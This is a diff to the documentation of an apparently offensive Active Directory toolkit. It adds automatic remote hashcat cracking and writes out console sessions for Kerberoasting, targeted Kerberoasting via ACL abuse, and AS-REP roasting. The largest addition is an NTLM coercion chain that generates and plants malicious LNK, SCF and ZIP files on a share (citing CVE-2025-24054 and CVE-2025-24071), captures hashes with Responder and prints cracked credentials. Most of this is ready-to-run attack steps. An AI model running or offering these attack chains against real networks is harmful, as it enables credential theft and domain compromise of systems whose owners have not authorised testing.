@@ -38,11 +38,13 @@ For Impacket/BloodyAD wrappers, see [Integrations](/uwu-toolkit/integrations/).
 
 Custom multi-step Active Directory attack modules.
 
+> Modules marked with **AUTO-CRACK** can automatically crack captured hashes via remote hashcat over SSH. Set `AUTO_CRACK yes` and configure `SSH_HOST` / `WORDLIST` to enable.
+
 | Module | Path | Description |
 |--------|------|-------------|
-| **Kerberoast** | `ad/kerberoast` | Request TGS tickets for offline cracking |
+| **Kerberoast** | `ad/kerberoast` | Request TGS tickets for offline cracking — **AUTO-CRACK** (mode 13100) |
 | **AS-REP Roast** | `ad/asreproast` | AS-REP roast users without Kerberos pre-auth |
-| **Targeted Kerberoast** | `ad/targeted_kerberoast` | Kerberoast with SPN manipulation on writable accounts |
+| **Targeted Kerberoast** | `ad/targeted_kerberoast` | Kerberoast via SPN manipulation on writable accounts — **AUTO-CRACK** (mode 13100, on by default) |
 | **Password Spray** | `ad/password_spray` | Password spraying with lockout-aware delays |
 | **Kerberos User Enum** | `ad/kerb_userenum` | Enumerate valid usernames via Kerberos |
 | **NetExec** | `ad/netexec` | Full NetExec wrapper (SMB, LDAP, WinRM, RDP, MSSQL, SSH) |
@@ -50,7 +52,7 @@ Custom multi-step Active Directory attack modules.
 | **BadSuccessor** | `ad/badsuccessor` | BadSuccessor dMSA privilege escalation |
 | **WriteAccountRestrictions** | `ad/WriteAccountRestrictions` | WriteAccountRestrictions ACL abuse |
 
-### Kerberoast Example
+### Kerberoast with Auto-Crack
 
 ```bash
 uwu > use ad/kerberoast
@@ -65,12 +67,37 @@ uwu kerberoast > options
   HASHES                    no        NTLM hash (LM:NT)
   DC_IP       10.10.10.100  no        Domain controller IP
   OUTPUT                    no        Output file for hashes
+  AUTO_CRACK  no            no        Auto-crack hashes via SSH hashcat
+  SSH_HOST    omarchy       no        Remote hashcat host
+  WORDLIST    rockyou.txt   no        Wordlist on remote host
 
+uwu kerberoast > set AUTO_CRACK yes
 uwu kerberoast > run
 
 [*] Requesting TGS tickets...
 [+] Found 3 Kerberoastable accounts
 [+] Hashes saved to kerberoast_hashes.txt
+[*] Auto-cracking with hashcat -m 13100...
+[+] Cracked 2/3 hashes:
+    svc_sql:Password123!
+    svc_backup:Summer2025
+```
+
+### Targeted Kerberoast (Auto-Crack On by Default)
+
+Exploits GenericWrite/GenericAll ACLs to set an SPN on a target account, then Kerberoasts it. Auto-crack is enabled by default — it loads the `hashcrack` module internally.
+
+```bash
+uwu > use ad/targeted_kerberoast
+uwu targeted_kerberoast > set TARGET_USER svc_admin
+uwu targeted_kerberoast > run
+
+[*] Setting SPN on svc_admin via GenericWrite...
+[*] Requesting TGS ticket...
+[+] Hash captured
+[*] Auto-cracking with hashcat -m 13100...
+[+] Cracked: svc_admin:Welcome1!
+[*] Cleaning up — removing SPN...
 ```
 
 ### Password Spray Example
@@ -103,7 +130,7 @@ uwu netexec > run
 | Module | Path | Description |
 |--------|------|-------------|
 | **AD Enum** | `ad/ad_enum` | Comprehensive AD enumeration |
-| **AD Enumerate All** | `ad/ad_enumerate_all` | Full-scope AD enumeration pipeline |
+| **AD Enumerate All** | `ad/ad_enumerate_all` | Full-scope AD enumeration pipeline — **AUTO-CRACK** (modes 13100 + 18200, on by default) |
 | **AD Attack Enum** | `ad/ad_attack_enum` | Attack surface enumeration |
 | **BloodHound Collect** | `ad/bloodhound_collect` | BloodHound data collection |
 | **BloodHound Edges** | `ad/bloodhound_edges` | BloodHound edge analysis |
@@ -117,6 +144,26 @@ uwu netexec > run
 | **SID Lookup** | `ad/sid_lookup` | SID-to-name resolution |
 | **UAC Decoder** | `ad/uac_decoder` | Decode userAccountControl flags |
 
+### AD Enumerate All (Auto-Crack On by Default)
+
+Runs LDAP enumeration, BloodHound collection, Kerberoasting, and AS-REP Roasting in one pass. Auto-cracks any captured hashes via the `hashcrack` module.
+
+```bash
+uwu > use ad/ad_enumerate_all
+uwu ad_enumerate_all > run
+
+[*] Phase 1: LDAP enumeration...
+[*] Phase 2: BloodHound collection...
+[*] Phase 3: Kerberoasting...
+[+] Found 4 Kerberoastable accounts
+[*] Auto-cracking TGS hashes (mode 13100)...
+[+] Cracked: svc_sql:Password123!
+[*] Phase 4: AS-REP Roasting...
+[+] Found 1 AS-REP vulnerable user
+[*] Auto-cracking AS-REP hashes (mode 18200)...
+[+] Cracked: svc_legacy:Welcome1
+```
+
 ### BloodHound Collection Example
 
 ```bash
@@ -125,20 +172,6 @@ uwu bloodhound_collect > run
 
 [*] Running BloodHound collection...
 [+] Data saved to bloodhound_data.zip
-```
-
-### AD Enum Example
-
-```bash
-uwu > use ad/ad_enum
-uwu ad_enum > run
-
-[*] Enumerating domain: corp.local
-[*] Users: 42
-[*] Groups: 18
-[*] Computers: 12
-[*] GPOs: 6
-[*] Trusts: 1
 ```
 
 ---
@@ -223,17 +256,46 @@ uwu rbcd_auto > run
 | **SMB Shares** | `auxiliary/smb/smb_shares` | SMB share enumeration and access check |
 | **SMB Read** | `auxiliary/smb/smb_read` | Read files from SMB shares |
 | **enum4linux** | `auxiliary/smb/enum4linux` | enum4linux-ng wrapper |
-| **NTLM Coerce** | `auxiliary/smb/ntlm_coerce` | NTLM authentication coercion (PetitPotam, PrinterBug, etc.) |
+| **NTLM Coerce** | `auxiliary/smb/ntlm_coerce` | Generate + plant coercion files, capture hashes — **AUTO-CRACK** (mode 5600) |
 
-### NTLM Coerce Example
+### NTLM Coerce — Full Attack Chain
+
+Generates malicious files (LNK, SCF, URL, library-ms, searchConnector-ms, desktop.ini, DOCX, XLSX, and more), uploads them to a target share, starts Responder to capture NTLMv2 hashes, and optionally cracks them.
+
+Supports CVE-2025-24054 (hash disclosure via ZIP extraction) and CVE-2025-24071 (hash disclosure via file preview).
 
 ```bash
 uwu > use auxiliary/smb/ntlm_coerce
-uwu ntlm_coerce > set LISTENER 10.10.14.50
+uwu ntlm_coerce > options
+
+  Name            Current         Required  Description
+  ----            -------         --------  -----------
+  LHOST           10.10.14.50     yes       Your listener IP
+  FILENAME        @important      no        Base filename for generated files
+  FILE_TYPE       all             no        all, lnk, scf, url, library-ms, docx, cve-2025-24054
+  CREATE_ZIP      yes             no        Wrap in ZIP (triggers CVE-2025-24054)
+  UPLOAD          yes             no        Upload files to target share
+  RHOSTS          10.10.10.100    no        Target host for upload
+  SHARE           Backups         no        Target share name
+  AUTO_RESPONDER  yes             no        Start Responder automatically
+  INTERFACE       tun0            no        Network interface for Responder
+  WAIT_TIME       60              no        Seconds to wait for hash capture
+  AUTO_CRACK      no              no        Auto-crack captured NTLMv2 hashes
+  WORDLIST        rockyou.txt     no        Wordlist for cracking
+
+uwu ntlm_coerce > set AUTO_CRACK yes
 uwu ntlm_coerce > run
 
-[*] Trying PetitPotam...
-[+] Coercion successful! Check your relay/responder
+[*] Generating coercion files...
+[+] Created: @important.lnk, @important.scf, @important.url, @important.library-ms, ...
+[+] ZIP payload created (CVE-2025-24054)
+[*] Uploading to \\10.10.10.100\Backups...
+[+] 8 files uploaded
+[*] Starting Responder on tun0...
+[*] Waiting 60s for hashes...
+[+] Captured NTLMv2 hash: CORP\z.fair::CORP:...
+[*] Auto-cracking with hashcat -m 5600...
+[+] Cracked: z.fair:soldier1
 ```
 
 ### SMB Shares Example
@@ -409,6 +471,19 @@ uwu aspx_shell > run
 | **Hashcrack** | `auxiliary/cracking/hashcrack` | Hash cracking with hashcat or john (local or remote SSH) |
 | **Cisco Type 5** | `auxiliary/cracking/cisco_type5_crack` | Cisco Type 5 password cracking |
 
+The `hashcrack` module is also used internally by other modules when their `AUTO_CRACK` option is enabled. It supports auto-detection of hash types and remote GPU cracking over SSH.
+
+**Supported hash types:** NTLM (1000), NTLMv1 (5500), NTLMv2 (5600), Kerberos TGS (13100), AS-REP (18200), DCC2 (2100), MD5 (0), SHA256 (1400), bcrypt (3200), WPA (22000), and more.
+
+### Modules with AUTO-CRACK
+
+| Module | Hash Type | Default |
+|--------|-----------|---------|
+| `ad/kerberoast` | TGS-REP (13100) | off |
+| `ad/targeted_kerberoast` | TGS-REP (13100) | **on** |
+| `ad/ad_enumerate_all` | TGS-REP (13100) + AS-REP (18200) | **on** |
+| `auxiliary/smb/ntlm_coerce` | NTLMv2 (5600) | off |
+
 ### Hashcrack Example
 
 ```bash
@@ -417,7 +492,7 @@ uwu hashcrack > set HASHFILE kerberoast_hashes.txt
 uwu hashcrack > set HASHTYPE 13100
 uwu hashcrack > run
 
-[*] Cracking with hashcat...
+[*] Cracking with hashcat -m 13100...
 [+] Cracked 2/5 hashes
     svc_sql:Password123!
     svc_backup:Summer2025
